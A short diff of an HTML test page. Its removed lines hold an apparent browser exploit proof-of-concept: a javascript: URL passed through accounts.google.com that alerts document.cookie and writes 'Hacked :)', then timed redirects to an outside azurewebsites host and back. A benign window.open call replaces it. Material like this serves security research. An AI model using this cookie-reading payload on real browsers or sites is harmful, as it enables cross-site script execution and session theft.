@@ -1,20 +1,11 @@
-<!DOCTYPE html>
 <html>
   <head>
     <meta charset="utf-8">
-    <title>test</title>
   </head>
   <body>
-    test
     <script>
       function go(){
-        w = window.open("https://accounts.google.com/?url=javascript:alert('Cookies%3A+'%2Bdocument.cookie);document.write('<h1>Hacked :)</h1>')");
-        setTimeout(()=>{
-          w.location.href = "http://shhnjk.azurewebsites.net:20/";
-          setTimeout(()=>{
-            w.location.href = "/back.html";
-          }, 1000);
-        }, 2000);
+       window.open("content.html");
       }
     </script>
     <h1><button onclick="go()">Go</button></h1>
